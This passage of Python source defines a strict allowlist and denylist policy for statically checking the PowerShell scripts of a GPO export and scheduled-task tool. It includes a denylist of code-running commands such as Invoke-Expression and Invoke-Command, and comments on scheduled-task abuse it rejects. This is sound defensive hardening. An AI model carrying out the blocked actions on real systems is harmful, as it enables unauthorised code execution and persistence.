        # index write $principals[$sid]
        "principals": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $principals[$sid]",
            }
        ),
        # argument of write-host
        "ptype": frozenset(
            {
                (
                    "[script] = switch ($objClass) { 'group' { 'Group' } 'computer' { "
                    "'Computer' } default { 'User' } }"
                ),
            }
        ),
        # argument of test-path
        "reportsdir": frozenset(
            {
                '[script] = Join-Path $SddlSource "reports"',
            }
        ),
        # argument of write-host
        "resolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "sam": frozenset(
            {
                '[script] = ""',
                "[script] = $matches[1]",
                "[script] = $matches[2]",
                "[script] = $translated",
                "[script] = if ($obj.sAMAccountName) { $obj.sAMAccountName } else { $obj.Name }",
            }
        ),
        # receiver of .getsecuritydescriptorsddlform()
        "sd": frozenset(
            {
                "[script] = $gpc.nTSecurityDescriptor",
            }
        ),
        # argument of .matches()
        "sddl": frozenset(
            {
                "[script] = $sd.GetSecurityDescriptorSddlForm()",
            }
        ),
        # argument of test-path
        "sddlsource": frozenset(
            {
                '[script] param ""',
            }
        ),
        # argument of new-object
        "sid": frozenset(
            {
                "[script] foreach $allSids | Sort-Object",
                "[script] foreach $domainSids",
            }
        ),
        # receiver of .translate()
        "sidobj": frozenset(
            {
                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
        # argument of write-host
        "translated": frozenset(
            {
                "[script] = $sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            }
        ),
        # argument of write-host
        "unresolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # condition $xmlFiles
        "xmlfiles": frozenset(
            {
                "[script] += $allXml",
                (
                    '[script] += (Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction '
                    "SilentlyContinue).FullName"
                ),
                "[script] = @()",
            }
        ),
    },
    "Run-GpoLensCollection.ps1": {
        # write root
        "archive": frozenset(
            {
                "[get-gpolenscompletedexports] foreach $candidates",
                "[invoke-gpolenscollection] foreach $expired",
            }
        ),
        # argument of .getstring()
        "bytes": frozenset(
            {
                "[assert-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
                "[write-gpolenscollectionlog] = $encoding.GetByteCount($line)",
            }
        ),
        # condition $candidates
        "candidates": frozenset(
            {
                (
                    "[get-gpolenscompletedexports] = @(Get-ChildItem -LiteralPath $OutputRoot "
                    "-File -Filter '*.zip' -ErrorAction Stop | Where-Object { $_.BaseName "
                    "-match '^.+-\\d{8}-\\d{6}$' -and (Test-Path -LiteralPath (Join-Path "
                    "(Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') -PathType Leaf) } | "
                    "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - "
                    "15) }; Descending = $true }, Name)"
                ),
            }
        ),
        # argument of .push()
        "child": frozenset(
            {
                (
                    "[assert-gpolensregulartree] foreach @(Get-ChildItem -LiteralPath "
                    "$directory -Force)"
                ),
            }
        ),
        # dynamic invocation & $CollectorPath -OutputRoot $OutputRoot *>&1
        "collectorpath": frozenset(
            {
                "[invoke-gpolenscollection] arg $CollectorPath",
                "[invoke-gpolenscollection] param",
                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # write root
        "copyto": frozenset(
            {
                "[invoke-gpolenscollection] arg $CopyTo",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # condition $created.Count -ne 1
        "created": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
                    "$OutputRoot | Where-Object { -not $previous.ContainsKey($_.FullName) })"
                ),
            }
        ),
        # write root
        "delivery": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $CopyTo $newest.Name",
            }
        ),
        # argument of get-item
        "directory": frozenset(
            {
                "[assert-gpolensregulartree] = $pending.Pop()",
            }
        ),
        # receiver of .getbytecount()
        "encoding": frozenset(
            {
                "[write-gpolenscollectionlog] = [Text.UTF8Encoding]::new($false)",
            }
        ),
        # receiver of .delete()
        "entry": frozenset(
            {
                "[invoke-gpolenscollection] = $zip.CreateEntry('gpo-inventory.json')",
                "[invoke-gpolenscollection] = $zip.GetEntry('gpo-inventory.json')",
                "[invoke-gpolenscollection] foreach @($inventory)",
            }
        ),
        # condition $expired
        "expired": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @(Get-GpoLensCompletedExports -OutputRoot "
                    "$OutputRoot | Where-Object { [string]::Equals($_.BaseName.Substring(0, "
                    "$_.BaseName.Length - 16), $producerPrefix, [StringComparison]::Ordinal) } "
                    "| Select-Object -Skip $Retention)"
                ),
            }
        ),
        # write root
        "exportdir": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $OutputRoot $newest.BaseName",
            }
        ),
        # argument of write-gpolenscollectionlog
        "failure": frozenset(
            {
                "[invoke-gpolenscollection] = $_",
            }
        ),
        # write root
        "folder": frozenset(
            {
                "[invoke-gpolenscollection] = Join-Path $OutputRoot $archive.BaseName",
            }
        ),
        # condition $i -ge 1
        "i": frozenset(
            {
                "[write-gpolenscollectionlog] = $LogFiles",
                "[write-gpolenscollectionlog] incdec PostfixMinusMinus",
            }
        ),
        # argument of .tryparse()
        "id": frozenset(
            {
                "[invoke-gpolenscollection] = [guid]::Empty",
                "[invoke-gpolenscollection] ref [guid]::TryParse([string]$entry.Id, [ref]$id)",
            }
        ),
        # receiver of .add()
        "ids": frozenset(
            {
                "[invoke-gpolenscollection] = [Collections.Generic.HashSet[guid]]::new()",
            }
        ),
        # condition -not $inventory
        "inventory": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = "
                    "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF) "
                    "| ConvertFrom-Json"
                ),
            }
        ),
        # argument of .getstring()
        "inventorybytes": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = [IO.File]::ReadAllBytes((Resolve-Path "
                    "-LiteralPath $InventoryPath).ProviderPath)"
                ),
            }
        ),
        # argument of resolve-path
        "inventorypath": frozenset(
            {
                "[invoke-gpolenscollection] arg $InventoryPath",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # condition $item.Attributes -band [IO.FileAttributes]::ReparsePoint
        "item": frozenset(
            {
                "[assert-gpolensregulartree] = Get-Item -LiteralPath $directory -Force",
            }
        ),
        # receiver of .substring()
        "line": frozenset(
            {
                '[write-gpolenscollectionlog] = "$(Get-Date -Format o) $Message`r`n"',
                (
                    '[write-gpolenscollectionlog] = $line.Substring(0, $maxChars) + " '
                    '[truncated]`r`n"'
                ),
            }
        ),
        # receiver of .dispose()
        "lock": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = [IO.File]::Open((Join-Path $OutputRoot "
                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                ),
            }
        ),
        # splatted
        "logargs": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = @{LogPath=(Join-Path $OutputRoot "
                    "'collection.log'); LogMaxBytes=$LogMaxBytes; LogFiles=$LogFiles}"
                ),
            }
        ),
        # argument of invoke-gpolenscollection
        "logfiles": frozenset(
            {
                "[invoke-gpolenscollection] arg $LogFiles",
                "[invoke-gpolenscollection] param 5",
                "[script] param 5",
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # argument of invoke-gpolenscollection
        "logmaxbytes": frozenset(
            {
                "[invoke-gpolenscollection] arg $LogMaxBytes",
                "[invoke-gpolenscollection] param 5242880",
                "[script] param 5242880",
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # write root
        "logpath": frozenset(
            {
                "[write-gpolenscollectionlog] param",
                "[write-gpolenscollectionlog] splat @logArgs",
            }
        ),
        # argument of test-path
        "marker": frozenset(
            {
                (
                    "[assert-gpolenscollectionowner] = Join-Path $OutputRoot "
                    "'.gpo-lens-collection-owner'"
                ),
                "[read-gpolensownermarkerbytes] arg $marker",
            }
        ),
        # argument of .substring()
        "maxchars": frozenset(
            {
                "[write-gpolenscollectionlog] = [math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
            }
        ),
        # read by a binding of $line
        "message": frozenset(
            {
                (
                    '[write-gpolenscollectionlog] arg "Collection failed: '
                    '$($failure.Exception.Message)"'
                ),
                (
                    '[write-gpolenscollectionlog] arg "Collection succeeded: $($newest.Name); '
                    'retained at most $Retention exports"'
                ),
                '[write-gpolenscollectionlog] arg "ZIP delivered: $delivery"',
                "[write-gpolenscollectionlog] arg 'Collection started'",
                "[write-gpolenscollectionlog] arg ($_ | Out-String).TrimEnd()",
                "[write-gpolenscollectionlog] param",
            }
        ),
        # write root
        "newest": frozenset(
            {
                "[invoke-gpolenscollection] = $created[0]",
            }
        ),
        # write root
        "next": frozenset(
            {
                '[write-gpolenscollectionlog] = "$LogPath.$i"',
            }
        ),
        # write root
        "old": frozenset(
            {
                (
                    "[write-gpolenscollectionlog] = if ($i -eq 1) { $LogPath } else { "
                    '"$LogPath.$($i - 1)" }'
                ),
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "[assert-gpolenscollectionowner] arg $OutputRoot",
                "[assert-gpolenscollectionowner] param",
                "[get-gpolenscompletedexports] arg $OutputRoot",
                "[get-gpolenscompletedexports] param",
                "[invoke-gpolenscollection] arg $OutputRoot",
                "[invoke-gpolenscollection] param",
                "[script] param",
            }
        ),
        # argument of .equals()
        "owner": frozenset(
            {
                (
                    "[assert-gpolenscollectionowner] = "
                    "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF).TrimEnd([c"
                    'har[]]"`r`n")'
                ),
            }
        ),
        # write root
        "partial": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = "
                    "\"$delivery.$([guid]::NewGuid().ToString('N')).partial\""
                ),
            }
        ),
        # receiver of .push()
        "pending": frozenset(
            {
                "[assert-gpolensregulartree] = [Collections.Generic.Stack[string]]::new()",
            }
        ),
        # receiver of .containskey()
        "previous": frozenset(
            {
                "[invoke-gpolenscollection] = @{}",
                "[invoke-gpolenscollection] index $previous[$_.FullName]",
            }
        ),
        # argument of where-object
        "producerprefix": frozenset(
            {
                (
                    "[invoke-gpolenscollection] = $newest.BaseName.Substring(0, "
                    "$newest.BaseName.Length - 16)"
                ),
            }
        ),
        # argument of select-object
        "retention": frozenset(
            {
                "[invoke-gpolenscollection] arg $Retention",
                "[invoke-gpolenscollection] param 14",
                "[script] param 14",
            }
        ),
        # argument of .push()
        "root": frozenset(
            {
                "[assert-gpolensregulartree] arg $folder",
                "[assert-gpolensregulartree] param",
            }
        ),
        # receiver of .write()
        "stream": frozenset(
            {
                "[invoke-gpolenscollection] = $entry.Open()",
            }
        ),
        # argument of assert-gpolenscollectionowner
        "taskname": frozenset(
            {
                "[assert-gpolenscollectionowner] arg $TaskName",
                "[assert-gpolenscollectionowner] param",
                "[invoke-gpolenscollection] arg $TaskName",
                "[invoke-gpolenscollection] param 'GpoLensCollection'",
                "[script] param 'GpoLensCollection'",
            }
        ),
        # receiver of .getentry()
        "zip": frozenset(
            {
                "[get-gpolenscompletedexports] = $null",
                (
                    "[get-gpolenscompletedexports] = "
                    "[IO.Compression.ZipFile]::OpenRead($archive.FullName)"
                ),
                "[invoke-gpolenscollection] = $null",
                (
                    "[invoke-gpolenscollection] = "
                    "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')"
                ),
            }
        ),
    },
    "GpoLensCollectionMarker.ps1": {
        # receiver of .toarray()
        "bytes": frozenset(
            {
                "[read-gpolensownermarkerbytes] = [IO.MemoryStream]::new()",
                "[write-gpolensownermarkerbytes] param",
            }
        ),
        # argument of .tryparse()
        "count": frozenset(
            {
                "[read-gpolensownermarkerbytes] = & stat -L --format=%h -- $opened 2>$null",
            }
        ),
        # read by a binding of $opened
        "fd": frozenset(
            {
                (
                    "[read-gpolensownermarkerbytes] = "
                    "$stream.SafeFileHandle.DangerousGetHandle().ToInt64()"
                ),
            }
        ),
        # argument of .tryparse()
        "links": frozenset(
            {
                "[read-gpolensownermarkerbytes] = 0",
                (
                    "[read-gpolensownermarkerbytes] = "
                    "[GpoLens.MarkerFileInfo]::LinkCount($stream.SafeFileHandle)"
                ),
                (
                    "[read-gpolensownermarkerbytes] ref [uint32]::TryParse([string]$count, "
                    "[ref]$links)"
                ),
            }
        ),
        # write root
        "marker": frozenset(
            {
                "[read-gpolensownermarkerbytes] param",
                (
                    "[write-gpolensownermarkerbytes] = Join-Path $root.FullName "
                    "'.gpo-lens-collection-owner'"
                ),
            }
        ),
        # argument of test-path
        "opened": frozenset(
            {
                '[read-gpolensownermarkerbytes] = "/proc/$PID/fd/$fd"',
            }
        ),
        # argument of get-item
        "outputroot": frozenset(
            {
                "[write-gpolensownermarkerbytes] param",
            }
        ),
        # argument of join-path
        "root": frozenset(
            {
                (
                    "[write-gpolensownermarkerbytes] = Get-Item -LiteralPath $OutputRoot "
                    "-Force -ErrorAction Stop"
                ),
            }
        ),
        # receiver of .toint64()
        "stream": frozenset(
            {
                (
                    "[read-gpolensownermarkerbytes] = [IO.File]::Open($Marker, "
                    "[IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::Read)"
                ),
                (
                    "[write-gpolensownermarkerbytes] = [IO.File]::Open($marker, "
                    "[IO.FileMode]::CreateNew, [IO.FileAccess]::Write, [IO.FileShare]::None)"
                ),
            }
        ),
    },
    "Register-GpoLensCollection.ps1": {
        # argument of new-scheduledtaskprincipal
        "account": frozenset(
            {
                "[script] = if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }",
            }
        ),
        # argument of new-scheduledtask
        "action": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskAction -Execute "
                    '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` '
                    "-Argument $taskArgs -WorkingDirectory $PSScriptRoot"
                ),
            }
        ),
        # argument of write-host
        "at": frozenset(
            {
                "[script] param '02:00'",
            }
        ),
        # parameter of write-gpolensownermarkerbytes (pinned in GpoLensCollectionMarker.ps1)
        "bytes": frozenset(
            {
                "[write-gpolensownermarkerbytes] arg $previousBytes",
                (
                    "[write-gpolensownermarkerbytes] arg "
                    "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
                ),
            }
        ),
        # argument of resolve-path
        "collectorpath": frozenset(
            {
                "[script] = (Resolve-Path -LiteralPath $CollectorPath).ProviderPath",
                "[script] param (Join-Path $PSScriptRoot 'Export-GpoEstate.ps1')",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "copyto": frozenset(
            {
                "[script] param",
            }
        ),
        # receiver of .getnetworkcredential()
        "credential": frozenset(
            {
                "[script] = $null",
                (
                    "[script] = Get-Credential -UserName $ServiceAccount -Message 'Collection "
                    "task credentials (saved only by Windows Task Scheduler)'"
                ),
                "[script] param",
            }
        ),
        # argument of new-scheduledtasktrigger
        "everydays": frozenset(
            {
                "[script] param 1",
            }
        ),
        # argument of new-scheduledtasksettingsset
        "executiontimelimit": frozenset(
            {
                "[script] param [timespan]::FromHours(2)",
            }
        ),
        # argument of set-gpolenscollectionowner
        "force": frozenset(
            {
                "[script] param",
                "[set-gpolenscollectionowner] arg $Force",
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of set-gpolenscollectionowner
        "gmsaaccount": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "inventorypath": frozenset(
            {
                "[script] param",
            }
        ),
        # receiver of .dispose()
        "lock": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] = [IO.File]::Open((Join-Path $OutputRoot "
                    "'collection.lock'), [IO.FileMode]::OpenOrCreate, "
                    "[IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
                ),
            }
        ),
        # read by a binding of $taskargs
        "logfiles": frozenset(
            {
                "[script] param 5",
            }
        ),
        # read by a binding of $taskargs
        "logmaxbytes": frozenset(
            {
                "[script] param 5242880",
            }
        ),
        # write root
        "marker": frozenset(
            {
                "[read-gpolensownermarkerbytes] arg $marker",
                (
                    "[set-gpolenscollectionowner] = Join-Path $OutputRoot "
                    "'.gpo-lens-collection-owner'"
                ),
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                "[script] = [IO.Path]::GetFullPath($OutputRoot)",
                "[script] param",
                "[set-gpolenscollectionowner] arg $OutputRoot",
                "[set-gpolenscollectionowner] param",
                "[write-gpolensownermarkerbytes] arg $OutputRoot",
            }
        ),
        # argument of write-warning
        "owner": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] = "
                    "[Text.Encoding]::UTF8.GetString($previousBytes).TrimStart([char]0xFEFF).Tr"
                    'imEnd([char[]]"`r`n")'
                ),
            }
        ),
        # argument of write-gpolensownermarkerbytes
        "previousbytes": frozenset(
            {
                "[set-gpolenscollectionowner] = $null",
                "[set-gpolenscollectionowner] = Read-GpoLensOwnerMarkerBytes -Marker $marker",
            }
        ),
        # argument of new-scheduledtask
        "principal": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskPrincipal -UserId $account -LogonType "
                    "Password -RunLevel Limited"
                ),
            }
        ),
        # dynamic invocation & $RegisterTask
        "registertask": frozenset(
            {
                (
                    "[set-gpolenscollectionowner] arg { if ($GmsaAccount) { "
                    "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force | "
                    "Out-Null } else { Register-ScheduledTask -TaskName $TaskName -InputObject "
                    "$task -User $ServiceAccount -Password $taskPassword -Force | Out-Null } }"
                ),
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of write-host
        "retention": frozenset(
            {
                "[script] param 14",
            }
        ),
        # argument of convertto-gpolenstaskargument
        "runner": frozenset(
            {
                (
                    "[script] = (Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                    "'Run-GpoLensCollection.ps1')).ProviderPath"
                ),
            }
        ),
        # argument of new-scheduledtasktrigger
        "scheduletime": frozenset(
            {
                "[script] = [datetime]::MinValue",
                (
                    "[script] ref [datetime]::TryParseExact($At, 'HH:mm', "
                    "[Globalization.CultureInfo]::InvariantCulture, "
                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)"
                ),
            }
        ),
        # argument of get-credential
        "serviceaccount": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of new-scheduledtask
        "settings": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
                    "$ExecutionTimeLimit ` -MultipleInstances IgnoreNew -StartWhenAvailable"
                ),
            }
        ),
        # argument of set-gpolenscollectionowner
        "task": frozenset(
            {
                (
                    "[script] = New-ScheduledTask -Action $action -Trigger $trigger -Principal "
                    "$principal -Settings $settings ` -Description 'Read-only GPO export, "
                    "bounded retention, rotating logs and optional ZIP delivery.'"
                ),
            }
        ),
        # argument of new-scheduledtaskaction
        "taskargs": frozenset(
            {
                (
                    "[script] += ' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $CopyTo))"
                ),
                (
                    "[script] += ' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $InventoryPath))"
                ),
                (
                    "[script] = '-NoProfile -NonInteractive -File ' + "
                    "(ConvertTo-GpoLensTaskArgument $runner) + ' -CollectorPath ' + "
                    "(ConvertTo-GpoLensTaskArgument $CollectorPath) + ' -OutputRoot ' + "
                    "(ConvertTo-GpoLensTaskArgument $OutputRoot) + ' -TaskName ' + "
                    '(ConvertTo-GpoLensTaskArgument $TaskName) + " -Retention $Retention '
                    '-LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
                ),
            }
        ),
        # argument of write-warning
        "taskname": frozenset(
            {
                "[script] param 'GpoLensCollection'",
                "[set-gpolenscollectionowner] arg $TaskName",
                "[set-gpolenscollectionowner] param",
            }
        ),
        # argument of set-gpolenscollectionowner
        "taskpassword": frozenset(
            {
                "[script] = $Credential.GetNetworkCredential().Password",
                "[script] = $null",
            }
        ),
        # argument of new-scheduledtask
        "trigger": frozenset(
            {
                (
                    "[script] = New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At "
                    "$scheduleTime"
                ),
            }
        ),
        # condition $Unregister
        "unregister": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of .getfullpath()
        "value": frozenset(
            {
                "[convertto-gpolensabsolutepath] arg $CopyTo",
                "[convertto-gpolensabsolutepath] arg $InventoryPath",
                "[convertto-gpolensabsolutepath] param",
                "[convertto-gpolenstaskargument] arg $CollectorPath",
                "[convertto-gpolenstaskargument] arg $OutputRoot",
                "[convertto-gpolenstaskargument] arg $TaskName",
                "[convertto-gpolenstaskargument] arg $runner",
                "[convertto-gpolenstaskargument] arg (ConvertTo-GpoLensAbsolutePath $CopyTo)",
                (
                    "[convertto-gpolenstaskargument] arg (ConvertTo-GpoLensAbsolutePath "
                    "$InventoryPath)"
                ),
                "[convertto-gpolenstaskargument] param",
            }
        ),
        # argument of new-scheduledtaskaction
        "windowsroot": frozenset(
            {
                "[script] = if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }",
            }
        ),
    },
}

# Allowlisted instance method -> the receiver variables it may be called on
# (casefolded). A call on any other receiver fails (Sol instance_delete,
# DeepSeek NB-1 ADSI.CopyTo). Calls whose receiver is a type literal (static
# dispatch, receiver_var null) are screened only by the type denylist.
INSTANCE_RECEIVERS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        "Replace": frozenset({"f"}),
        "Substring": frozenset({"f"}),
        "Dispose": frozenset({"zip"}),
        "Add": frozenset(
            {"collectionerrors", "knownids", "successsections", "failedsections", "allsids"}
        ),
        "Trim": frozenset({"_", "gpc", "pf"}),
        "Contains": frozenset({"knownids"}),
        "Translate": frozenset({"sidobj"}),
        "Split": frozenset({"dom"}),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {
        "Add": frozenset({"allsids"}),
        "GetSecurityDescriptorSddlForm": frozenset({"sd"}),
        "Translate": frozenset({"sidobj"}),
    },
    "Run-GpoLensCollection.ps1": {
        "Substring": frozenset({"line", "_", "newest"}),
        "GetByteCount": frozenset({"encoding"}),
        "GetEntry": frozenset({"zip"}),
        "Dispose": frozenset({"zip", "stream", "lock"}),
        "Push": frozenset({"pending"}),
        "Pop": frozenset({"pending"}),
        "Add": frozenset({"ids"}),
        "ContainsKey": frozenset({"previous"}),
        "Delete": frozenset({"entry"}),
        "CreateEntry": frozenset({"zip"}),
        "Open": frozenset({"entry"}),
        "Write": frozenset({"stream"}),
    },
    "GpoLensCollectionMarker.ps1": {
        "ToInt64": frozenset({"stream"}),
        "DangerousGetHandle": frozenset({"stream"}),
        "CopyTo": frozenset({"stream"}),
        "ToArray": frozenset({"bytes"}),
        "Dispose": frozenset({"bytes", "stream"}),
        "Write": frozenset({"stream"}),
    },
    "Register-GpoLensCollection.ps1": {
        "Dispose": frozenset({"lock"}),
        "ShouldProcess": frozenset({"pscmdlet"}),
        "GetNetworkCredential": frozenset({"credential"}),
    },
}

# Register-GpoLensCollection is the only script that writes a scheduled task.
# Each task cmdlet call must match one of these EXACT argument vectors (a frozen
# set of (parameter, normalized value) pairs, switch params valued None). An
# extra, missing or changed argument — a wildcard `-TaskName '*'`, a `-CimSession`
# remote target, `-RunLevel Highest`, a different `-Execute`/`-Argument` — matches
# no vector and fails (Sol task_abuse / taskname / unregister / cimsession /
# runlevel; DeepSeek NB-2). `Unregister-ScheduledTask` is included, so a
# wildcard deletion is rejected.
_PS = '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"'
TaskVector = frozenset[tuple[str, str | None]]
TASK_ARG_VECTORS: dict[str, frozenset[TaskVector]] = {
    "New-ScheduledTaskAction": frozenset(
        {
            frozenset(
                {("Execute", _PS), ("Argument", "$taskArgs"), ("WorkingDirectory", "$PSScriptRoot")}
            )
        }
    ),
    "New-ScheduledTaskPrincipal": frozenset(
        {frozenset({("UserId", "$account"), ("LogonType", "Password"), ("RunLevel", "Limited")})}
    ),
    "New-ScheduledTaskTrigger": frozenset(
        {frozenset({("Daily", None), ("DaysInterval", "$EveryDays"), ("At", "$scheduleTime")})}
    ),
    "New-ScheduledTaskSettingsSet": frozenset(
        {
            frozenset(
                {
                    ("ExecutionTimeLimit", "$ExecutionTimeLimit"),
                    ("MultipleInstances", "IgnoreNew"),
                    ("StartWhenAvailable", None),
                }
            )
        }
    ),
    "New-ScheduledTask": frozenset(
        {
            frozenset(
                {
                    ("Action", "$action"),
                    ("Trigger", "$trigger"),
                    ("Principal", "$principal"),
                    ("Settings", "$settings"),
                    (
                        "Description",
                        "'Read-only GPO export, bounded retention, rotating logs and "
                        "optional ZIP delivery.'",
                    ),
                }
            )
        }
    ),
    "Register-ScheduledTask": frozenset(
        {
            frozenset({("TaskName", "$TaskName"), ("InputObject", "$task"), ("Force", None)}),
            frozenset(
                {
                    ("TaskName", "$TaskName"),
                    ("InputObject", "$task"),
                    ("User", "$ServiceAccount"),
                    ("Password", "$taskPassword"),
                    ("Force", None),
                }
            ),
        }
    ),
    "Unregister-ScheduledTask": frozenset(
        {frozenset({("TaskName", "$TaskName"), ("Confirm", "$false")})}
    ),
}
_TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"
# Casefolded view (command and parameter names; values stay verbatim).
_TASK_VECTORS_CF: dict[str, frozenset[TaskVector]] = {
    cmd.casefold(): frozenset(frozenset((p.casefold(), v) for p, v in vec) for vec in vectors)
    for cmd, vectors in TASK_ARG_VECTORS.items()
}

# ---------------------------------------------------------------------------
# Round-4 closed sets (both reviewers' round-3 findings). Strict default: what
# cannot be positively pinned is refused.
# ---------------------------------------------------------------------------

# AST node types the collectors may contain: exactly the ones they use today.
# Classes/enums, DSC configurations, dynamic keywords, data sections, traps,
# `$using:`, pipeline chains (&&/||), ternaries and parse-error nodes are all
# refused rather than reasoned about.
ALLOWED_NODE_TYPES = frozenset(
    {
        "ArrayExpressionAst",
        "ArrayLiteralAst",
        "AssignmentStatementAst",
        "AttributeAst",
        "BinaryExpressionAst",
        "CatchClauseAst",
        "CommandAst",
        "CommandExpressionAst",
        "CommandParameterAst",
        "ConstantExpressionAst",
        "ContinueStatementAst",
        "ConvertExpressionAst",
        "ExitStatementAst",
        "ExpandableStringExpressionAst",
        "FileRedirectionAst",
        "ForEachStatementAst",
        "ForStatementAst",
        "FunctionDefinitionAst",
        "HashtableAst",
        "IfStatementAst",
        "IndexExpressionAst",
        "InvokeMemberExpressionAst",
        "MemberExpressionAst",
        "MergingRedirectionAst",
        "NamedAttributeArgumentAst",
        "NamedBlockAst",
        "ParamBlockAst",
        "ParameterAst",
        "ParenExpressionAst",
        "PipelineAst",
        "ReturnStatementAst",
        "ScriptBlockAst",
        "ScriptBlockExpressionAst",
        "StatementBlockAst",
        "StringConstantExpressionAst",
        "SubExpressionAst",
        "SwitchStatementAst",
        "ThrowStatementAst",
        "TryStatementAst",
        "TypeConstraintAst",
        "TypeExpressionAst",
        "UnaryExpressionAst",
        "VariableExpressionAst",
        "WhileStatementAst",
    }
)

# Commands that can never be allowlisted for a collector, whatever a policy
# says: they rebind command resolution (aliases, functions, drives, location),
# write variables by name, load or run code, or register engine callbacks.
FORBIDDEN_COMMANDS = frozenset(
    {
        "Add-PSSnapin",
        "Clear-Item",
        "Clear-Variable",
        "Export-Alias",
        "Import-Alias",
        "Import-Module",
        "Invoke-Command",
        "Invoke-Expression",
        "Invoke-Item",
        "New-Alias",
        "New-Module",
        "New-PSDrive",
        "New-Variable",
        "Pop-Location",
        "Push-Location",
        "Register-EngineEvent",
        "Register-ObjectEvent",
        "Remove-Variable",
        "Set-Alias",
        "Set-Item",
        "Set-ItemProperty",
        "Set-Location",
        "Set-PSBreakpoint",
        "Set-Variable",
        "Start-Job",
        "Start-Process",
        "Start-ThreadJob",
        "Update-FormatData",
        "Update-TypeData",
    }
)

# Automatic and preference variables. The engine reads them, so binding one
# changes how *other* statements behave ($PSDefaultParameterValues injects
# parameters into later calls; $PSModuleAutoLoadingPreference/$ErrorAction-
# Preference/...); a write is refused unless it is in SPECIAL_BINDINGS. Any
# variable named *Preference is treated the same way.
_SPECIAL_VARIABLES = frozenset(
    {
        "$",
        "?",
        "^",
        "_",
        "args",
        "consolefilename",
        "enabledexperimentalfeatures",
        "error",
        "errorview",
        "event",
        "eventargs",
        "eventsubscriber",
        "executioncontext",
        "false",
        "foreach",
        "formatenumerationlimit",
        "home",
        "host",
        "input",
        "iscoreclr",
        "islinux",
        "ismacos",
        "iswindows",
        "lastexitcode",
        "logcommandhealthevent",
        "logcommandlifecycleevent",
        "logenginehealthevent",
        "logenginelifecycleevent",
        "logproviderhealthevent",
        "logproviderlifecycleevent",
        "matches",
        "maximumaliascount",
        "maximumdrivecount",
        "maximumerrorcount",
        "maximumfunctioncount",
        "maximumhistorycount",
        "maximumvariablecount",
        "myinvocation",
        "nestedpromptlevel",
        "null",
        "ofs",
        "outputencoding",
        "pid",
        "profile",
        "psboundparameters",
        "pscmdlet",
        "pscommandpath",
        "psculture",
        "psdebugcontext",
        "psdefaultparametervalues",
        "psedition",
        "psemailserver",
        "pshome",
        "psitem",
        "psnativecommandargumentpassing",
        "psnativecommanduseerroractionpreference",
        "psscriptroot",
        "pssenderinfo",
        "pssessionapplicationname",
        "pssessionconfigurationname",
        "pssessionoption",
        "psstyle",
        "psuiculture",
        "psversiontable",
        "pwd",
        "sender",
        "shellid",
        "stacktrace",
        "switch",
        "this",
        "transcript",
        "true",
    }
)
# Never referenced at all (read or write): engine-wide parameter injection,
